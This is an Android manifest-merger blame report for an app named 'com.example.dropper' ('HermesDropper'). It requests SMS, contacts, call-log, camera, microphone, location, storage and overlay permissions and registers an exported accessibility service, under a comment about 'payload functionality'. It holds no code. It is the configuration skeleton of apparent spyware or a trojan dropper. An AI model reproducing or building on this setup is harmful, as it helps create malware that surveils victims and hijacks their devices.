build/intermediates/manifest_merge_blame_file/release/manifest-merger-blame-release-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.example.dropper"
4    android:versionCode="1"
5    android:versionName="1.0" >
6
7    <uses-sdk
8        android:minSdkVersion="26"
8-->src/main/AndroidManifest.xml
9        android:targetSdkVersion="34" />
9-->src/main/AndroidManifest.xml
10
11    <!-- Essential permissions for payload functionality -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:7:5-67
12-->src/main/AndroidManifest.xml:7:22-64
13    <uses-permission android:name="android.permission.CAMERA" />
13-->src/main/AndroidManifest.xml:8:5-65
13-->src/main/AndroidManifest.xml:8:22-62
14    <uses-permission android:name="android.permission.READ_CONTACTS" />
14-->src/main/AndroidManifest.xml:9:5-72
14-->src/main/AndroidManifest.xml:9:22-69
15    <uses-permission android:name="android.permission.READ_SMS" />
15-->src/main/AndroidManifest.xml:10:5-67
15-->src/main/AndroidManifest.xml:10:22-64
16    <uses-permission android:name="android.permission.SEND_SMS" />
16-->src/main/AndroidManifest.xml:11:5-67
16-->src/main/AndroidManifest.xml:11:22-64
17    <uses-permission android:name="android.permission.RECORD_AUDIO" />
17-->src/main/AndroidManifest.xml:12:5-71
17-->src/main/AndroidManifest.xml:12:22-68
18    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
18-->src/main/AndroidManifest.xml:13:5-79
18-->src/main/AndroidManifest.xml:13:22-76
19    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
19-->src/main/AndroidManifest.xml:14:5-81
19-->src/main/AndroidManifest.xml:14:22-78
20    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
20-->src/main/AndroidManifest.xml:15:5-75
20-->src/main/AndroidManifest.xml:15:22-72
21    <uses-permission android:name="android.permission.CALL_PHONE" />
21-->src/main/AndroidManifest.xml:16:5-69
21-->src/main/AndroidManifest.xml:16:22-66
22    <uses-permission android:name="android.permission.READ_CALL_LOG" />
22-->src/main/AndroidManifest.xml:17:5-72
22-->src/main/AndroidManifest.xml:17:22-69
23    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
23-->src/main/AndroidManifest.xml:18:5-73
23-->src/main/AndroidManifest.xml:18:22-70
24    <uses-permission
24-->src/main/AndroidManifest.xml:19:5-21:38
25        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
25-->src/main/AndroidManifest.xml:20:9-65
26        android:maxSdkVersion="28" />
26-->src/main/AndroidManifest.xml:21:9-35
27    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
27-->src/main/AndroidManifest.xml:22:5-80
27-->src/main/AndroidManifest.xml:22:22-77
28    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
28-->src/main/AndroidManifest.xml:23:5-24:40
28-->src/main/AndroidManifest.xml:23:22-79
29
30    <!-- Permission for displaying overlay -->
31    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
31-->src/main/AndroidManifest.xml:27:5-78
31-->src/main/AndroidManifest.xml:27:22-75
32
33    <!-- Accessibility service permission -->
34    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
34-->src/main/AndroidManifest.xml:30:5-85
34-->src/main/AndroidManifest.xml:30:22-82
35
36    <!-- Device admin permissions -->
37    <uses-permission android:name="android.permission.DEVICE_POWER" />
37-->src/main/AndroidManifest.xml:33:5-71
37-->src/main/AndroidManifest.xml:33:22-68
38    <uses-permission android:name="android.permission.WAKE_LOCK" />
38-->src/main/AndroidManifest.xml:34:5-68
38-->src/main/AndroidManifest.xml:34:22-65
39
40    <!-- Network state permissions -->
41    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
41-->src/main/AndroidManifest.xml:37:5-79
41-->src/main/AndroidManifest.xml:37:22-76
42    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
42-->src/main/AndroidManifest.xml:38:5-76
42-->src/main/AndroidManifest.xml:38:22-73
43    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
43-->src/main/AndroidManifest.xml:39:5-76
43-->src/main/AndroidManifest.xml:39:22-73
44
45    <permission
45-->[androidx.core:core:1.10.1] AndroidManifest.xml:22:5-24:47
46        android:name="com.example.dropper.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
46-->[androidx.core:core:1.10.1] AndroidManifest.xml:23:9-81
47        android:protectionLevel="signature" />
47-->[androidx.core:core:1.10.1] AndroidManifest.xml:24:9-44
48
49    <uses-permission android:name="com.example.dropper.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
49-->[androidx.core:core:1.10.1] AndroidManifest.xml:26:5-97
49-->[androidx.core:core:1.10.1] AndroidManifest.xml:26:22-94
50
51    <application
51-->src/main/AndroidManifest.xml:41:5-76:19
52        android:allowBackup="true"
52-->src/main/AndroidManifest.xml:42:9-35
53        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
53-->[androidx.core:core:1.10.1] AndroidManifest.xml:28:18-86
54        android:dataExtractionRules="@xml/data_extraction_rules"
54-->src/main/AndroidManifest.xml:43:9-65
55        android:extractNativeLibs="false"
56        android:fullBackupContent="@xml/backup_rules"
56-->src/main/AndroidManifest.xml:44:9-54
57        android:icon="@mipmap/ic_launcher"
57-->src/main/AndroidManifest.xml:45:9-43
58        android:label="@string/app_name"
58-->src/main/AndroidManifest.xml:46:9-41
59        android:supportsRtl="true"
59-->src/main/AndroidManifest.xml:47:9-35
60        android:theme="@style/Theme.HermesDropper"
60-->src/main/AndroidManifest.xml:48:9-51
61        android:usesCleartextTraffic="true" >
61-->src/main/AndroidManifest.xml:49:9-44
62
63        <!-- Main activity -->
64        <activity
64-->src/main/AndroidManifest.xml:53:9-60:20
65            android:name="com.example.dropper.MainActivity"
65-->src/main/AndroidManifest.xml:54:13-41
66            android:exported="true" >
66-->src/main/AndroidManifest.xml:55:13-36
67            <intent-filter>
67-->src/main/AndroidManifest.xml:56:13-59:29
68                <action android:name="android.intent.action.MAIN" />
68-->src/main/AndroidManifest.xml:57:17-69
68-->src/main/AndroidManifest.xml:57:25-66
69
70                <category android:name="android.intent.category.LAUNCHER" />
70-->src/main/AndroidManifest.xml:58:17-77
70-->src/main/AndroidManifest.xml:58:27-74
71            </intent-filter>
72        </activity>
73
74        <!-- AccessibilityService definition -->
75        <service
75-->src/main/AndroidManifest.xml:63:9-75:19
76            android:name="com.example.dropper.services.HermesAccessibilityService"
76-->src/main/AndroidManifest.xml:64:13-64
77            android:description="@string/accessibility_service_description"
77-->src/main/AndroidManifest.xml:66:13-76
78            android:exported="true"
78-->src/main/AndroidManifest.xml:68:13-36
79            android:label="@string/accessibility_service_label"
79-->src/main/AndroidManifest.xml:65:13-64
80            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
80-->src/main/AndroidManifest.xml:67:13-79
81            <intent-filter>
81-->src/main/AndroidManifest.xml:69:13-71:29
82                <action android:name="android.accessibilityservice.AccessibilityService" />
82-->src/main/AndroidManifest.xml:70:17-92
82-->src/main/AndroidManifest.xml:70:25-89
83            </intent-filter>
84
85            <meta-data
85-->src/main/AndroidManifest.xml:72:13-74:72
86                android:name="android.accessibilityservice"
86-->src/main/AndroidManifest.xml:73:17-60
87                android:resource="@xml/accessibility_service_config" />
87-->src/main/AndroidManifest.xml:74:17-69
88        </service>
89
90        <provider
90-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
91            android:name="androidx.startup.InitializationProvider"
91-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
92            android:authorities="com.example.dropper.androidx-startup"
92-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
93            android:exported="false" >
93-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
94            <meta-data
94-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
95                android:name="androidx.emoji2.text.EmojiCompatInitializer"
95-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
96                android:value="androidx.startup" />
96-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
97            <meta-data
97-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:29:13-31:52
98                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
98-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:30:17-78
99                android:value="androidx.startup" />
99-->[androidx.lifecycle:lifecycle-process:2.6.1] AndroidManifest.xml:31:17-49
100            <meta-data
100-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
101                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
101-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
102                android:value="androidx.startup" />
102-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
103        </provider>
104
105        <receiver
105-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
106            android:name="androidx.profileinstaller.ProfileInstallReceiver"
106-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
107            android:directBootAware="false"
107-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
108            android:enabled="true"
108-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
109            android:exported="true"
109-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36
110            android:permission="android.permission.DUMP" >
110-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:39:13-57
111            <intent-filter>
111-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:40:13-42:29
112                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
112-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:17-91
112-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:25-88
113            </intent-filter>
114            <intent-filter>
114-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:43:13-45:29
115                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
115-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:17-85
115-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:25-82
116            </intent-filter>
117            <intent-filter>
117-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:46:13-48:29
118                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
118-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:17-88
118-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:25-85
119            </intent-filter>
120            <intent-filter>
120-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:49:13-51:29
121                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
121-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:17-95
121-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:25-92
122            </intent-filter>
123        </receiver>
124    </application>
125
126</manifest>